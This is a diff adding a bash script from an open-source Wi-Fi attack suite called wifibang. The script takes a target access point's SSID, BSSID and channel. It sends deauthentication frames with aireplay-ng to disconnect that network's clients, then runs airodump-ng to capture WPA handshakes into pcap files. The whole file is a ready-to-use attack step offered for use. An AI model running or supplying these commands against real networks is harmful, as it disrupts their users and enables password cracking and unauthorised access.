@@ -1,0 +1,43 @@
+#!/bin/bash
+
+
+#wifibang    -    wifi attacks suite
+#Copyright © 2018 Leviathan36 
+
+# This file is part of wifibang.
+
+#	wifibang is free software: you can redistribute it and/or modify
+#	it under the terms of the GNU General Public License as published by
+#	the Free Software Foundation, either version 3 of the License, or
+#	(at your option) any later version.
+
+#	wifibang is distributed in the hope that it will be useful,
+#	but WITHOUT ANY WARRANTY; without even the implied warranty of
+#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#	GNU General Public License for more details.
+
+#	You should have received a copy of the GNU General Public License
+#	along with wifibang.  If not, see <http://www.gnu.org/licenses/>.
+
+
+
+####################################################
+                    #AIRODUMP#
+####################################################
+
+ap_ssid=$1
+ap_target=$2
+ap_channel=$3
+wifi_int=$4
+
+handshake_directory="./handshakes"
+
+clear
+echo    #formatting op
+
+sudo aireplay-ng -08 -a $ap_target --ignore-negative-one $wifi_int || exit 1
+
+#to  avoid too long file name I had use this ${ap_ssid:0:7}
+sudo airodump-ng -w "$handshake_directory/${ap_target}__${ap_ssid:0:7}" --output-format pcap --bssid $ap_target --channel $ap_channel --ignore-negative-one $wifi_int || exit 1
+     
+################### END AIRODUMP ###################
